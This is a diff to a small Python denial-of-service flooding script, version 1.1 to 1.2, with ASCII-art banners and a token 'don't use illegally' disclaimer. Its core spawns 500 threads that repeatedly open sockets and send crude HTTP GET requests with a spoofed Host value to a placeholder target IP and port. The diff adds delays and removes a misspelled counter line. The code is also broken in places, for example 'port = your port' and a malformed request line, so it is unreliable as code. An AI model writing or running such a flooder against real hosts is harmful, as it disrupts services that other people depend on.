@@ -1,22 +1,26 @@
 import threading
 import socket
+import time
 
 print(
 """
-    ___   ___           __
-    |  '  |  '    __   /
-    | | | | | |  '  '  \_
-    | | | | | | | || |   \
-    |__'  |__'   '__'  __/
+    ___   ___           __  
+    |  '  |  '    __   /    
+    | | | | | |  '  '  \_   
+    | | | | | | | || |   \  
+    |__'  |__'   '__'  __/  
 """)
+
+time.sleep(2)
 
 print("""
 ________________________
-made by Bananut|v1.1
+made by Bananut|v1.2
 ____________________________________
 Pleas don't use this script illegaly.      
 """)
 
+time.sleep(5)
 target = "target ip"
 port = your port
 fake_ip = "make a fake ip"
@@ -30,8 +34,6 @@ def attack():
         s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
         s.close()
-        global already_connected
-        already_connectected += 1
 
 for i in range(500):
     thread = threading.Thread(target=attack)
